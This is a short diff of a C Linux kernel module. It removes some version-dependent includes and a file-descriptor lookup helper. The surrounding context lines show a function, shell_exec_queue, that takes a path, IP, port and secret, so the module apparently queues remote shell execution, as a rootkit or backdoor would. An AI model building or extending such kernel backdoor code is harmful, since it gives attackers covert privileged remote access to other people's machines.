@@ -31,18 +31,8 @@
 #include <linux/workqueue.h>
 #include <net/inet_sock.h>
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
-#include <linux/proc_ns.h>
-#else
-#include <linux/proc_fs.h>
-#endif
-#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 26)
-#include <linux/fdtable.h>
-#endif
-
 #include "engine/engine.c"
 #include "engine/engine.h"
-
 #include "config.h"
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
@@ -307,26 +297,6 @@ int shell_exec_queue(char *path, char *ip, char *port, char *secret)
 	}
 
 	return queue_work(work_queue, &task->work);
-}
-
-struct file *e_fget_light(unsigned int fd, int *fput_needed)
-{
-	struct file *file;
-	struct files_struct *files = current->files;
-
-	*fput_needed = 0;
-	if (likely((atomic_read(&files->count) == 1))) {
-		file = fcheck(fd);
-	} else {
-		spin_lock(&files->file_lock);
-		file = fcheck(fd);
-		if (file) {
-			get_file(file);
-			*fput_needed = 1;
-		}
-		spin_unlock(&files->file_lock);
-	}
-	return file;
 }
 
 int f_check(void *arg, ssize_t size)
